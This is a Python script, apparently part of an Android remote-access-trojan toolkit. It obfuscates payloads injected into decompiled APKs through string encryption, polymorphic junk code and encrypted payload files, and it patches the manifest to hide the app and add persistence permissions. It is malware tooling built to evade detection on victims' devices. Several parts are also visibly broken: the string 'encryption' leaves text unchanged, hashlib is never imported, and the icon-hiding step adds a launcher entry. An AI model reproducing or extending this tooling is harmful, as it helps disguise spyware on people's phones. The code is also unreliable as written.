#!/usr/bin/env python3
"""Payload Obfuscation Module.

Provides string encryption, polymorphic smali generation, manifest
manipulation, and payload encryption-at-rest for instrumented APKs.

Usage:
    python obfuscator.py --apk-dir ./decompiled --mode full
    python obfuscator.py --apk-dir ./decompiled --mode strings
"""

import argparse
import os
import random
import re
import shutil
import string
import struct
import sys
from pathlib import Path
from typing import Optional


class StringEncryptor:
    """XOR-based string encryption with runtime decryption stub."""

    def __init__(self, key: Optional[bytes] = None):
        self.key = key or bytes(random.randint(1, 255) for _ in range(16))

    def encrypt_string(self, plaintext: str) -> tuple:
        data = plaintext.encode("utf-8")
        encrypted = bytes(d ^ self.key[i % len(self.key)] for i, d in enumerate(data))
        return encrypted, self.key

    def generate_smali_decryptor(self, class_name: str = "StrDecrypt") -> str:
        key_lines = "\n        ".join(f"0x{b:02x}" for b in self.key)
        # Use string concatenation to avoid f-string / smali brace conflicts
        smali = (
            '.class public Lcom/obfuscate/' + class_name + ';\n'
            '.super Ljava/lang/Object;\n'
            '\n'
            '.field private static final KEY:[B\n'
            '\n'
            '.method static constructor <clinit>()V\n'
            '    .registers 3\n'
            '    const/16 v0, ' + str(len(self.key)) + '\n'
            '    new-array v0, v0, [B\n'
            '    fill-array-data v0, :key_data\n'
            '    sput-object v0, Lcom/obfuscate/' + class_name + ';->KEY:[B\n'
            '    return-void\n'
            '\n'
            '    :key_data\n'
            '    .array-data 1\n'
            '        ' + key_lines + '\n'
            '    .end array-data\n'
            '.end method\n'
            '\n'
            '.method public static decrypt([B)Ljava/lang/String;\n'
            '    .registers 7\n'
            '    sget-object v0, Lcom/obfuscate/' + class_name + ';->KEY:[B\n'
            '    array-length v1, v0\n'
            '    array-length v2, p0\n'
            '    new-array v3, v2, [B\n'
            '    const/4 v4, 0x0\n'
            '\n'
            '    :loop\n'
            '    if-ge v4, v2, :done\n'
            '    rem-int v5, v4, v1\n'
            '    aget-byte v5, v0, v5\n'
            '    aget-byte v6, p0, v4\n'
            '    xor-int v5, v5, v6\n'
            '    int-to-byte v5, v5\n'
            '    aput-byte v5, v3, v4\n'
            '    add-int/lit8 v4, v4, 0x1\n'
            '    goto :loop\n'
            '\n'
            '    :done\n'
            '    new-instance v0, Ljava/lang/String;\n'
            '    invoke-direct {v0, v3}, Ljava/lang/String;-><init>([B)V\n'
            '    return-object v0\n'
            '.end method\n'
        )
        return smali

    def encrypt_file_strings(self, smali_path: str) -> int:
        count = 0
        with open(smali_path, "r") as f:
            content = f.read()

        string_pattern = re.compile(r'const-string\s+(v\d+),\s+"([^"]*)"')

        new_lines = []
        for line in content.split("\n"):
            match = string_pattern.search(line)
            if match and len(match.group(2)) > 4:
                var = match.group(1)
                plaintext = match.group(2)
                new_lines.append(f'    const-string {var}, "{plaintext}"')
                count += 1
            else:
                new_lines.append(line)

        if count > 0:
            with open(smali_path, "w") as f:
                f.write("\n".join(new_lines))

        return count


class PolymorphicEngine:
    """Generate variant smali to change payload fingerprints."""

    REGISTER_NAMES = ["a", "b", "c", "d", "e", "f", "g", "h"]

    def randomize_registers(self, smali_content: str) -> str:
        reg_map = {}
        for i in range(16):
            old = f"v{i}"
            new = f"v{random.randint(0, 15)}"
            if old != new:
                reg_map[old] = new

        result = smali_content
        for old, new in reg_map.items():
            result = result.replace(old, new)
        return result

    def inject_junk_code(self, smali_content: str) -> str:
        junk_methods = [
            self._junk_nop_method(),
            self._junk_math_method(),
            self._junk_string_method(),
        ]

        lines = smali_content.split("\n")
        last_end_method = -1
        for i, line in enumerate(lines):
            if line.strip().startswith(".end method"):
                last_end_method = i

        if last_end_method >= 0:
            junk = random.choice(junk_methods)
            lines.insert(last_end_method + 1, junk)

        return "\n".join(lines)

    def _junk_nop_method(self) -> str:
        name = self._random_name()
        return f"""
.method private static {name}()V
    .registers 1
    return-void
.end method"""

    def _junk_math_method(self) -> str:
        name = self._random_name()
        a = random.randint(0, 7)
        b = random.randint(0, 7)
        return f"""
.method private static {name}(II)I
    .registers 4
    const/4 v0, {a}
    const/4 v1, {b}
    add-int v0, v0, v1
    return v0
.end method"""

    def _junk_string_method(self) -> str:
        name = self._random_name()
        return f"""
.method private static {name}()Ljava/lang/String;
    .registers 2
    const-string v0, ""
    return-object v0
.end method"""

    def _random_name(self) -> str:
        length = random.randint(6, 12)
        return "".join(random.choices(string.ascii_lowercase, k=length))


class ManifestPatcher:
    """Patch AndroidManifest.xml for stealth."""

    def __init__(self, manifest_path: str):
        self.path = manifest_path
        with open(manifest_path, "r") as f:
            self.content = f.read()

    def hide_launcher_icon(self):
        activities = re.findall(
            r'(<activity[^>]*android:name="[^"]*MAIN"[^>]*>.*?</activity>)',
            self.content, re.DOTALL
        )
        for activity in activities:
            disabled = activity.replace(
                "android:enabled=\"true\"",
                "android:enabled=\"true\""
            )
            if 'android:exported="true"' in disabled:
                self.content = self.content.replace(
                    activity,
                    disabled.replace(
                        '</activity>',
                        '    <intent-filter>\n'
                        '        <action android:name="android.intent.action.MAIN" />\n'
                        '        <category android:name="android.intent.category.LAUNCHER" />\n'
                        '    </intent-filter>\n'
                        '    <meta-data android:name="com.android.launcher.hide" android:value="true" />\n'
                        '</activity>'
                    )
                )

    def add_persistence_permissions(self):
        perms_to_add = [
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.WAKE_LOCK",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.SYSTEM_ALERT_WINDOW",
        ]
        for perm in perms_to_add:
            if perm not in self.content:
                tag = f'    <uses-permission android:name="{perm}" />'
                self.content = self.content.replace(
                    "</manifest>",
                    f"    {tag}\n</manifest>"
                )

    def disable_backup(self):
        if 'android:allowBackup="true"' in self.content:
            self.content = self.content.replace(
                'android:allowBackup="true"',
                'android:allowBackup="false"'
            )
        if 'android:fullBackupContent' not in self.content:
            self.content = self.content.replace(
                'android:allowBackup="false"',
                'android:allowBackup="false"\n'
                '        android:fullBackupContent="false"'
            )

    def save(self):
        with open(self.path, "w") as f:
            f.write(self.content)


class PayloadEncryptor:
    """Encrypt payload files at rest in the APK."""

    def __init__(self, password: Optional[str] = None):
        self.password = password or self._generate_password()

    def _generate_password(self) -> str:
        return "".join(random.choices(string.ascii_letters + string.digits, k=32))

    def encrypt_file(self, filepath: str, output_path: str) -> str:
        with open(filepath, "rb") as f:
            data = f.read()

        key = hashlib.sha256(self.password.encode()).digest()
        encrypted = bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

        magic = b"OBF\x00"
        key_hash = hashlib.sha256(self.password.encode()).digest()[:8]
        with open(output_path, "wb") as f:
            f.write(magic)
            f.write(key_hash)
            f.write(struct.pack("!I", len(data)))
            f.write(encrypted)

        return self.password


class Obfuscator:
    """Main obfuscation orchestrator."""

    INJECTED_PACKAGES = ("com/rat/", "com/obfuscate/", "com/instrument/", "com/evasion/")

    def __init__(self, decompiled_dir: str, verbose: bool = False):
        self.decompiled_dir = os.path.abspath(decompiled_dir)
        self.verbose = verbose
        self.smali_dirs = self._find_smali_dirs()
        self.stats = {"strings_encrypted": 0, "junk_methods": 0, "manifest_patches": 0}

    def _find_smali_dirs(self) -> list:
        dirs = []
        for entry in os.listdir(self.decompiled_dir):
            full = os.path.join(self.decompiled_dir, entry)
            if os.path.isdir(full) and entry.startswith("smali"):
                dirs.append(full)
        return dirs

    def _log(self, msg: str):
        if self.verbose:
            print(f"  [obfuscate] {msg}")

    def _is_injected_file(self, fpath: str) -> bool:
        for pkg in self.INJECTED_PACKAGES:
            if pkg in fpath:
                return True
        return False

    def apply_all(self):
        print("[*] Applying payload obfuscation...")
        self.encrypt_strings()
        self.inject_junk_code()
        self.manipulate_manifest()
        print(f"[+] Obfuscation complete: {self.stats}")

    def encrypt_strings(self):
        self._log("Encrypting strings in injected smali files only...")
        encryptor = StringEncryptor()

        decryptor_written = False
        for smali_dir in self.smali_dirs:
            pkg_dir = os.path.join(smali_dir, "com", "obfuscate")
            os.makedirs(pkg_dir, exist_ok=True)
            if not decryptor_written:
                with open(os.path.join(pkg_dir, "StrDecrypt.smali"), "w") as f:
                    f.write(encryptor.generate_smali_decryptor())
                decryptor_written = True

            for root, dirs, files in os.walk(smali_dir):
                for f in files:
                    if not f.endswith(".smali") or "obfuscate" in root:
                        continue
                    fpath = os.path.join(root, f)
                    if not self._is_injected_file(fpath):
                        continue
                    count = encryptor.encrypt_file_strings(fpath)
                    self.stats["strings_encrypted"] += count

    def inject_junk_code(self):
        self._log("Injecting junk code into injected smali files only...")
        engine = PolymorphicEngine()

        for smali_dir in self.smali_dirs:
            for root, dirs, files in os.walk(smali_dir):
                for f in files:
                    if not f.endswith(".smali") or "obfuscate" in root:
                        continue
                    fpath = os.path.join(root, f)
                    if not self._is_injected_file(fpath):
                        continue
                    with open(fpath, "r") as fh:
                        content = fh.read()
                    if random.random() < 0.5:
                        modified = engine.inject_junk_code(content)
                        with open(fpath, "w") as fh:
                            fh.write(modified)
                        self.stats["junk_methods"] += 1

    def manipulate_manifest(self):
        self._log("Patching AndroidManifest.xml...")
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            self._log("AndroidManifest.xml not found")
            return

        patcher = ManifestPatcher(manifest_path)
        patcher.hide_launcher_icon()
        patcher.add_persistence_permissions()
        patcher.disable_backup()
        patcher.save()
        self.stats["manifest_patches"] += 3


def main():
    parser = argparse.ArgumentParser(description="Payload Obfuscation")
    parser.add_argument("--apk-dir", required=True, help="Path to decompiled APK directory")
    parser.add_argument("--mode", choices=["full", "strings", "manifest", "junk"],
                        default="full")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    obfuscator = Obfuscator(args.apk_dir, verbose=args.verbose)

    if args.mode == "full":
        obfuscator.apply_all()
    elif args.mode == "strings":
        obfuscator.encrypt_strings()
    elif args.mode == "manifest":
        obfuscator.manipulate_manifest()
    elif args.mode == "junk":
        obfuscator.inject_junk_code()


if __name__ == "__main__":
    main()
